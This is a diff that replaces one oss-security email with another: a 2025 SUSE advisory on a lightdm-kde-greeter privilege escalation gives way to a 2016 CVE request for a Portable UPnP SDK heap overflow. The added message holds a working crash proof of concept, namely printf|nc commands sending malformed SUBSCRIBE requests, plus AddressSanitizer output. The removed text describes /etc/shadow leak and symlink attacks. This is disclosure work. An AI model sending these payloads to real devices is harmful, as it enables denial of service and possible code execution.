@@ -1,4 +1,9 @@
-Received: (qmail 11915 invoked by uid 550); 17 Nov 2025 14:39:08 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["10424" "Thursday" "8" "September" "2016" "17:16:11" "-0400" "Scott Tenaglia" "scott.tenaglia@invincea.com" "<CAJ+owFvNgnDNAK5xv_X_GU9UnrBb7mJS1=OeH=oH0QX9tgfYdw@mail.gmail.com>" "234" "[oss-security] CVE Request: Heap Overflow Portable UPnP SDK 1.6.19 through 1.8.x" nil nil nil "9" "2016090821:16:11" "[oss-security] CVE Request: Heap Overflow Portable UPnP SDK 1.6.19 through 1.8.x" (number mark "U       scott.tenagl Sep  8  234/10424 " thread-indent "\"[oss-security] CVE Request: Heap Overflow Portable UPnP SDK 1.6.19 through 1.8.x\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 9223 invoked by uid 550); 8 Sep 2016 21:20:33 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,303 +12,266 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 11856 invoked from network); 17 Nov 2025 14:39:08 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1763390338; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type;
-	bh=aCZyfcobQHODy9rrp6l2VCyJfc6AtoaJFrTibG/azEo=;
-	b=M59AjVK006FVVo1nrZkQ8M+f7ONtudJK5t6wjYEGKNghUALY0g7cT3zOecRjiqVr/MmxMd
-	v3aJ72tWDt7nUhPZIYvupz91DUn9GCAYldujNWHbH7SZ27Uozz8PmP9/0WO1dMogRTsfrV
-	4a7AEZULeYGQWSIrmcR9fkL5MTc6nh4=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1763390338;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type;
-	bh=aCZyfcobQHODy9rrp6l2VCyJfc6AtoaJFrTibG/azEo=;
-	b=lV5kk+2NE1vaf4HJEW3XX3uEzBCl3qZeFlSwQkJXji3qBie/Jw8pxl7LS8mtUimvmDFNhb
-	SNScUruya8u3Y2Cw==
-Authentication-Results: smtp-out2.suse.de;
-	dkim=pass header.d=suse.de header.s=susede2_rsa header.b=M59AjVK0;
-	dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=lV5kk+2N
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1763390338; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type;
-	bh=aCZyfcobQHODy9rrp6l2VCyJfc6AtoaJFrTibG/azEo=;
-	b=M59AjVK006FVVo1nrZkQ8M+f7ONtudJK5t6wjYEGKNghUALY0g7cT3zOecRjiqVr/MmxMd
-	v3aJ72tWDt7nUhPZIYvupz91DUn9GCAYldujNWHbH7SZ27Uozz8PmP9/0WO1dMogRTsfrV
-	4a7AEZULeYGQWSIrmcR9fkL5MTc6nh4=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1763390338;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type;
-	bh=aCZyfcobQHODy9rrp6l2VCyJfc6AtoaJFrTibG/azEo=;
-	b=lV5kk+2NE1vaf4HJEW3XX3uEzBCl3qZeFlSwQkJXji3qBie/Jw8pxl7LS8mtUimvmDFNhb
-	SNScUruya8u3Y2Cw==
-Date: Mon, 17 Nov 2025 15:38:57 +0100
-From: Matthias Gerstner <mgerstner@suse.de>
-To: oss-security@lists.openwall.com
-Message-ID: <aRszgdEcjCyuaqCS@kasco.suse.de>
+Received: (qmail 7342 invoked from network); 8 Sep 2016 21:16:23 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=invincea.com; s=google;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=gXjIPF0LHiY8nig2ZSvivtKmoUyEw94dgW5qbIU8e48=;
+        b=gIR6X4eTudPlDXwT73eL5jLd52QLh9UKJgB3dWZzzRf968Thm+0eLIp4CcUSLjO4q1
+         mMR8i0fTpa+5/0VFhAZF9sWYG92lXStW5dU2JaWHjHSVEdvWiQKOy++N1ufkvPuslT1I
+         77HBmq74e8++1a1wNsLeMBNruHGR4SpkAOmyc=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=gXjIPF0LHiY8nig2ZSvivtKmoUyEw94dgW5qbIU8e48=;
+        b=laH3u4C4qSbf0yB7FaL6FlV190NBwCdCyWg6ru96u0X7Ka+nMaOhrWtMQFnBuxAiyj
+         eh2LmzSnpicI8RLKiDZ/iFdQvc8sv9D+B8dkU8qqu8OlFU1PZAIaJwM3E1Gg/raiGVeB
+         jTBTFPZmWeHgT6Z/zRdeFM0jyNpvbbaPnMFQ/qWghtkFaO+bFLiigIz5VjkYqiOg5jjl
+         WBoiRy11xzO9DTPXWnIvYWLaLUSZERDnK59clp1nbO85DYud2kSD+Kg/KZJsoCiEsKST
+         DN46oCiGnt5b3RS3ED1E1ejVK9ZjXxnp50/bodolY5bZLlDooNbfNQf2SJQYA2foROx/
+         qfCg==
+X-Gm-Message-State: AE9vXwPvbfr0aH+5bLXLvGAzgtfs5VIkpLRLWbn9KhDJLLkoUa6fSPJadSWl6ILCepbh7Uc3UIZJWKpBcZbEWMxb
+X-Received: by 10.176.2.178 with SMTP id 47mr74787uah.10.1473369371506; Thu,
+ 08 Sep 2016 14:16:11 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
-	protocol="application/pgp-signature"; boundary="kEB3+00XL4MVtyEb"
-Content-Disposition: inline
-X-Spam-Level: 
-X-Spam-Flag: NO
-X-Spam-Score: -6.61
-Subject: [oss-security] lightdm-kde-greeter: Privilege Escalation from lightdm Service User
- to root in KAuth Helper Service (CVE-2025-62876)
-
---kEB3+00XL4MVtyEb
-Content-Type: text/plain; protected-headers=v1; charset=iso-8859-1
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-Date: Mon, 17 Nov 2025 15:38:57 +0100
-From: Matthias Gerstner <mgerstner@suse.de>
+From: Scott Tenaglia <scott.tenaglia@invincea.com>
+Date: Thu, 8 Sep 2016 17:16:11 -0400
+Message-ID: <CAJ+owFvNgnDNAK5xv_X_GU9UnrBb7mJS1=OeH=oH0QX9tgfYdw@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Subject: lightdm-kde-greeter: Privilege Escalation from lightdm Service User
- to root in KAuth Helper Service (CVE-2025-62876)
+Content-Type: multipart/alternative; boundary=001a113cd3ca030dc1053c058a66
+Subject: [oss-security] CVE Request: Heap Overflow Portable UPnP SDK 1.6.19 through 1.8.x
 
-Hello list,
+--001a113cd3ca030dc1053c058a66
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-please find below a report about a `lightdm` to `root` privilege
-escalation in lightdm-kde-greeter [1]. We also offer a rendered version
-of this report on our blog [2].
+My previous request for a CVE seems to have been ignored. The only reason I
+can see is because I omitted the words "Heap Overflow" from the subject
+line. Resubmitting with amended subject line to get back in the queue.
 
-Summary: lightdm-kde-greeter is a KDE-themed greeter application for the
-lightdm display manager. It contains a KAuth-based D-Bus helper
-application for performing privileged operations, which suffers from a
-`lightdm` to `root` privilege escalation and some other shortcomings in
-versions up to 6.0.3. In discussions with upstream we managed to arrive
-at a much improved version of the affected code.
+Portable UPnP SDK: https://sourceforge.net/projects/pupnp/
+Bug report: https://sourceforge.net/p/pupnp/bugs/133/
 
-1) Introduction
+There is a heap buffer overflow vulnerability in the create_url_list
+function in upnp/src/gena/gena_device.c. I first discovered this
+vulnerability when working with version 1.6.19 and have confirmed that it
+also exists in the latest code on the master branch (1.8.x). At the very
+least a reliable denial of service condition can be created by crashing the
+program.
+
+The problem in create_url_list starts in the following for-loop. The point
+of the loop is to parse the list of URIs enclosed in angled brackets (=E2=
+=80=98<=E2=80=98
+and =E2=80=98>=E2=80=99) in the CALLBACK header of a SUBSCRIBE request. If =
+the call to
+parse_uri() fails for any reason other than UPNP_E_OUTOF_MEMORY, or the
+hostport field of the parsed URI has a size of zero, then the URLcount
+variable will not be incremented. If 2 URIs are provided, with the first
+one being correctly formatted, and the second not, then URLcount will equal
+1 coming out of this loop.
+
+    for( i =3D 0; i < URLS->size; i++ ) {
+        if( ( URLS->buff[i] =3D=3D '<' ) && ( i + 1 < URLS->size ) ) {
+            if( ( ( return_code =3D parse_uri( &URLS->buff[i + 1],
+                                             URLS->size - i + 1,
+                                             &temp ) ) =3D=3D HTTP_SUCCESS )
+                && ( temp.hostport.text.size !=3D 0 ) ) {
+                URLcount++;
+            } else {
+                if( return_code =3D=3D UPNP_E_OUTOF_MEMORY ) {
+                    return return_code;
+                }
+            }
+        }
+    }
+
+The next bit of code (abbreviated for readability) is where the overflow
+actually occurs. The first conditional evaluates to true because URLcount
+is 1. Next, a buffer is allocated (out->URLs) to hold a copy of the
+original URI string. Then, an array of uri_type structs are allocated
+(out->parsedURLs) to hold details of each parsed URI. The size of this
+array is going to be 1, because URLcount is 1. The problem is that the
+for-loop then parses the *original* URI string again. In fact, the only
+real difference between this for-loop and the previous one is that the
+parsed URIs are stored at successive indexes in the parsedURLs array
+instead of a temporary variable. So when it gets to parsing the second URI
+it passes out->parsedURLs[2] to the parse_uri() function, which is an
+address passed the end of the allocated array. As parse_uri() populates
+values of the struct it is writing passed the end of the array.
+
+    if( URLcount > 0 ) {
+        out->URLs =3D malloc(URLS->size + 1);
+        out->parsedURLs =3D malloc(sizeof(uri_type) * URLcount);
+        // omitted for readability
+        memcpy( out->URLs, URLS->buff, URLS->size );
+        out->URLs[URLS->size] =3D 0;
+        URLcount =3D 0;
+        for( i =3D 0; i < URLS->size; i++ ) {
+            if( ( URLS->buff[i] =3D=3D '<' ) && ( i + 1 < URLS->size ) ) {
+                if( ( ( return_code =3D
+                        parse_uri( &out->URLs[i + 1], URLS->size - i + 1,
+                                   &out->parsedURLs[URLcount] ) ) =3D=3D
+                      HTTP_SUCCESS )
+                    && ( out->parsedURLs[URLcount].hostport.text.size !=3D
+                         0 ) ) {
+                    URLcount++;
+                } else {
+                    if( return_code =3D=3D UPNP_E_OUTOF_MEMORY ) {
+                        free( out->URLs );
+                        free( out->parsedURLs );
+                        out->URLs =3D NULL;
+                        out->parsedURLs =3D NULL;
+                        return return_code;
+                    }
+                }
+            }
+        }
+    }
+
+Depending on the format of the malformed URI different things happen.
+Sometimes the overwrite has no noticeable impact, while other times it will
+crash the program. At the very least it is possible to create a reliable
+denial of service condition. It may also be possible to use this for remote
+code execution.
+
+Below are the steps that I used to trigger the vulnerability on both
+version 1.6.19 and 1.8.0. They should be sufficient to recreate the issue.
+
+First, compile for 32-bit with debugging enabled and an installation
+directory set. The reason for the setting the installation directory and
+compiling for 32-bits is so that =E2=80=9Cmake install=E2=80=9D results in =
+a single binary
+that is easy to debug.
+
+./configure --prefix=3D<install dir> --enable-debug --host=3Di686-linux-gnu
+CFLAGS=3D"-m32 -fno-omit-frame-pointer" LDFLAGS=3D-m32
+make clean;make install
+
+To setup the default sample, which emulates a TV device, do the following
+from the libupnp directory:
+cd upnp/sample
+mkdir tvdevice
+cp -r web tvdevice
+
+To run the sample change to the directory you just created and run the
+binary:
+cd tvdevice
+../.libs/tv_device
+
+With the sample running go to another terminal window. Enter the following
+to create a non-malicious subscription message:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153>\r\nNT: upnp:event\r\nTIMEOUT: Second-1801\r\n\r\n"
+| nc 127.0.0.1 49152
+
+One form of a malicious message will crash the application is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><http://a:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Another is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><//:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Below is the output of address sanitizer from either of the two requests ab=
+ove
+(add =E2=80=9C-fsanitize=3Daddress=E2=80=9D to CFLAGS  during configure).
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+=3D=3D13048=3D=3D ERROR: AddressSanitizer: heap-buffer-overflow on address
+0xeef07710 at pc 0xf698b0c3 bp 0xf1463998 sp 0xf1463988
+WRITE of size 4 at 0xeef07710 thread T8
+    #0 0xf698b0c2 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x460c2)
+    #1 0xf698cb13 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x47b13)
+    #2 0xf6992e1c (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4de1c)
+    #3 0xf6993bae (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4ebae)
+    #4 0xf69999f3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x549f3)
+    #5 0xf6964b8f (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fb8f)
+    #6 0xf6964e58 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fe58)
+    #7 0xf693baa4 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5aa4)
+    #8 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #9 0xf69f13bc (/usr/lib/libasan.so.0.0.0+0xa3bc)
+    #10 0xf68feb2b (/usr/lib/libpthread-2.17.so+0x6b2b)
+    #11 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+0xeef07710 is located 8 bytes to the right of 168-byte region
+[0xeef07660,0xeef07708)
+allocated by thread T8 here:
+    #0 0xf69fe45f (/usr/lib/libasan.so.0.0.0+0x1745f)
+    #1 0xf69928da (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4d8da)
+    #2 0xf6993bae (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4ebae)
+    #3 0xf69999f3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x549f3)
+    #4 0xf6964b8f (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fb8f)
+    #5 0xf6964e58 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fe58)
+    #6 0xf693baa4 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5aa4)
+    #7 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #8 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+Thread T8 created by T0 here:
+    #0 0xf69f12ca (/usr/lib/libasan.so.0.0.0+0xa2ca)
+    #1 0xf693be13 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5e13)
+    #2 0xf693c882 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x6882)
+    #3 0xf6967c74 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x22c74)
+    #4 0xf69a2aee (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x5daee)
+    #5 0xf69a2d2d (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x5dd2d)
+    #6 0x804fc17 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x804fc17)
+    #7 0x805056c (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x805056c)
+    #8 0x8050631 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x8050631)
+    #9 0xf6754942 (/usr/lib/libc-2.17.so+0x19942)
+Shadow bytes around the buggy address:
+  0x3dde0e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ec0: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
+  0x3dde0ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=3D>0x3dde0ee0: 00 fa[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00
+  0x3dde0ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3dde0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+=3D=3D13048=3D=3D ABORTING
 
-lightdm-kde-greeter [1] is a KDE-themed greeter application for the
-lightdm display manager [3]. At the beginning of September one of our
-community packagers asked us [4] to review a D-Bus service contained in
-lightdm-kde-greeter for addition to openSUSE Tumbleweed.
-
-In the course of the review we found a potential privilege escalation
-from the `lightdm` service user to `root` which is facilitated by this
-D-Bus service, among some other shortcomings in its implementation.
-
-The next section provides a general overview of the D-Bus service.
-Section 3 discusses the security problems in the service's
-implementation. Section 4 takes a look at the bugfix upstream arrived
-at.
-
-This report is based on lightdm-kde-greeter release 6.0.3 [5].
-
-2) Overview of the D-Bus Helper
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D
-
-lightdm-kde-greeter includes a D-Bus service which enables regular users
-to configure custom themes to be used by the greeter application. The
-D-Bus service is implemented as a KDE KAuth helper service [6], running
-with full root privileges.
-
-The helper implements a single API method [7], protected by Polkit
-action `org.kde.kcontrol.kcmlightdm.save`, which requires
-`auth_admin_keep` by default, i.e. users need to provide root
-credentials to perform this action. The method takes a map of key/value
-pairs which allow to fully control the contents of `lightdm.conf` and
-`lightdm-kde-greeter.conf`.
-
-=46rom a security point of view such a generic interface is sub-optimal,
-since the scope of the operation is not restricted to changing theme
-settings, but also allows to change all the rest of lightdm's
-configuration, providing less control over who may do what in the
-system. From an application's point of view this approach is
-understandable, however, as this makes it easy to support any future
-features.
-
-Another Polkit action `org.kde.kcontrol.kcmlightdm.savethemedetails` is
-declared in `kcm_lightdm.actions` [8], which is unused, maybe a remnant
-of former versions of the project.
-
-3) Problems in the D-Bus Helper
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D
-
-The problems in the D-Bus service start in helper.cc line 87 [9], where
-we can find this comment:
-
-```
-// keys starting with "copy_" are handled in a special way, in fact,
-// this is an instruction to copy the file to the greeter's home
-// directory, because the greeter will not be able to read the image
-// from the user's home folder
-```
-
-To start with it is rather bad API design to abuse the key/value map,
-which is supposed to contain configuration file entries, for carrying
-"secret" copy instructions. Even worse, in the resulting copy operation
-three different security contexts are mixed:
-
-- the helper, which runs with full root privileges.
-- the unprivileged D-Bus client, which specifies a path to be opened by
-  the helper.
-- the `lightdm` service user; the helper will copy the user-specified
-  file into a directory controlled by it.
-
-The helper performs this copy operation with full `root` privileges
-without taking precautions, reading input data from one unprivileged
-context and writing it into another unprivileged context. This is done
-naively using the Qt framework's `QFile::copy()` and similar APIs,
-leading to a range of potential local attack vectors:
-
-- Denial-of-Service (e.g. passing a named FIFO pipe as source file path,
-  causing the D-Bus helper to block indefinitely).
-- information leak (e.g. passing a path to private data as source file
-  like `/etc/shadow`, which will then become public in
-  `/var/lib/lightdm`).
-- creation of directories in unexpected locations (the helper attempts
-  to create `/var/lib/lightdm/.../<theme>`, thus the lightdm user can
-  place symlinks there which will be followed).
-- overwrite of unexpected files (similar as before, symlinks can be
-  placed as destination file name, which will be followed and
-  overwritten with client data).
-
-If this action would ever be set to `yes` Polkit authentication
-requirements, then this would be close to a local root exploit. Even in
-its existing form it allows the `lightdm` service user to escalate
-privileges to `root`.
-
-Interestingly these problems are quite similar to issues in `sddm-kcm6`,
-which we covered in a previous report [10].
-
-4) Upstream Bugfix
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-We suggested the following changes to upstream to address the problems:
-
-- the copy operation should be implemented using D-Bus file descriptor
-  passing, this way opening client-controlled paths as `root` is already
-  avoided.
-- for creating the file in the target directory of `lightdm`, a
-  privilege drop to the `lightdm` service user should be performed to
-  avoid any symlink attack surface.
-
-We are happy to share that the upstream maintainer of
-lightdm-kde-greeter followed our suggestions closely and coordinated the
-changes with us before the publication of the bugfix. With these
-changes, this KAuth helper is now kind of a model implementation which
-can serve as a positive example for other KDE components. Upstream also
-performed some general cleanup, like the removal of the unused
-`savethemedetails` Polkit action from the repository.
-
-Upstream released version 6.0.4 [11] of lightdm-kde-greeter which
-contains the fixes.
-
-5) CVE Assignment
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-In agreement with upstream, we assigned CVE-2025-62876 to track the
-`lightdm` service user to `root` privilege escalation aspect described
-in this report.  The severity of the issue is low, since it only affects
-defense-in-depth (if the `lightdm` service user were compromised) and
-the problematic logic can only be reached and exploited if triggered
-interactively by a privileged user.
-
-6) Coordinated Disclosure
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-We reported these issues to KDE security on 2025-09-04 offering
-coordinated disclosure, but we initially had difficulties setting up the
-process with them. Upstream did not clearly express the desire to
-practice coordinated disclosure, no (preliminary) publication date could
-be set and no confirmation of the issues was received.
-
-Things took a turn for the better when a lightdm-kde-greeter developer
-contacted us directly on 2025-10-16 and the publication date and fixes
-were discussed. The ensuing review process for the bugfixes was very
-helpful in our opinion, leading to a major improvement of the KAuth
-helper implementation in lightdm-kde-greeter.
-
-7) Timeline
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-2025-09-04: We received the review request [4] for the lightdm-kde-greeter =
-D-Bus service.
-2025-09-10: We privately reported the findings to KDE security.
-2025-09-17: We received an initial reply from KDE security stating that the=
-y would get back to us.
-2025-09-29: We asked for at least a confirmation of the report and a rough =
-disclosure date, but upstream was not able to provide this.
-2025-10-01: KDE security informed us that an upstream developer planned to =
-release fixes by mid-November.
-2025-10-16: An upstream developer contacted us to discuss the publication d=
-ate, since the bugfixes were ready.
-2025-10-20: We asked the developer to share the bugfixes for review.
-2025-10-21: The developer shared a patch set with us.
-2025-10-24: We agreed on 2025-10-31 for coordinated disclosure date.
-2025-10-28: After a couple of email exchanges discussing the patches, upstr=
-eam arrived at an improved patch set. We suggested to assign a CVE for the =
-`lightdm` to `root` attack surface.
-2025-10-29: We assigned CVE-2025-62876.
-2025-11-03: We asked when the bugfix release would be published, with the d=
-isclosure date already passed.
-2025-11-03: Upstream agreed to publish on the same day.
-2025-11-03: Upstream released version 6.0.4 [11] containing the bugfixes. W=
-e published our Bugzilla bug [4] on the topic.
-2025-11-13: Publication of this report.
-
-8) References
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-[1]: https://invent.kde.org/plasma/lightdm-kde-greeter
-[2]: https://security.opensuse.org/2025/11/13/lightdm-kde-greeter-auth-help=
-er.html
-[3]: https://github.com/canonical/lightdm
-[4]: https://bugzilla.suse.com/show_bug.cgi?id=3D1249146
-[5]: https://invent.kde.org/plasma/lightdm-kde-greeter/-/tags/v6.0.3
-[6]: https://security.opensuse.org/2024/04/02/kde6-dbus-polkit.html#the-kde=
--kauth-framework
-[7]: https://invent.kde.org/plasma/lightdm-kde-greeter/-/blob/v6.0.3/kcm/he=
-lper.cpp#L48
-[8]: https://invent.kde.org/plasma/lightdm-kde-greeter/-/blob/v6.0.3/kcm/kc=
-m_lightdm.actions?ref_type=3Dtags#L39
-[9]: https://invent.kde.org/plasma/lightdm-kde-greeter/-/blob/v6.0.3/kcm/he=
-lper.cpp?ref_type=3Dtags#L87
-[10]: https://security.opensuse.org/2024/04/02/kde6-dbus-polkit.html#proble=
-matic-file-system-operations-in-sddm-kcm6
-[11]: https://invent.kde.org/plasma/lightdm-kde-greeter/-/tags/v6.0.4
-
-Best Regards
-
-Matthias
-
---=20
-Matthias Gerstner <matthias.gerstner@suse.de>
-Security Engineer
-https://www.suse.com/security
-GPG Key ID: 0x14C405C971923553
-=20
-SUSE Software Solutions Germany GmbH
-HRB 36809, AG N=FCrnberg
-Gesch=E4ftsf=FChrer: Jochen Jaser, Andrew McDonald, Werner Knoblich
-
---kEB3+00XL4MVtyEb
-Content-Type: application/pgp-signature; name=signature.asc
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmkbM4EACgkQFMQFyXGS
-NVNJaQ/9FLns6H40UhWvHgkOMWESV22DHHgRxvalfS2LryHab1ZJJmZpQxOfufbW
-GXTCVx5VGEiC+cITVu3OF6dLDrtGTqcqJXvHDTHb5vOuRhn8MDcuu8KwtcZVTdyt
-gd44CaocJvfFFp2lScB9ULUZIB1DokfOqC50ZrDhQYUkdy4IPPLzLTY2GT3wBU0U
-0WAE3LU/h8BxAx+sYq4Ez0mM0kPvHMWV5lrOK2ugH/5bihb/lxQB/2KXAajxIT29
-1UkjnM5ltgNG9e8tBnSykJNlDFF6ZKxSaE813e/hlCdlGAsu69iN42iorX+zWWlU
-QpctVcHSSA9+Qby5NgrbHwveyE5wciKzBtvAAjhWSn1BOyDxpmsJaPtpq7PR6VHB
-iHT/GE1a9TtRx9GeV35RO1MuH1+1B9xAinDGy9JRVKeTqS/A7GgGT1szu13BuEW9
-q/W55TRyvBi6H2toQaKRQaEtXdeFLavpZueTnOWsOATb1HM9q46wtUepjxYJGx/3
-/RpL0atKHIa84YaOLwWvdNP4/NWyWqmvHwS9npmNgufzZVLN8/leWLvI3Zjdm6FD
-8Sj6Dn/H1naui7psGMO4GWxgeb64UlEcb/gCLdx/ag39KgbRFkdGSmK7AG6La4Kv
-f7nsAK9gT2l5/dCK2UDd6tXkmmyPZQVTkjmxqGCPM5d4m6xcDbg=
-=CkCR
------END PGP SIGNATURE-----
-
---kEB3+00XL4MVtyEb--
+--001a113cd3ca030dc1053c058a66--
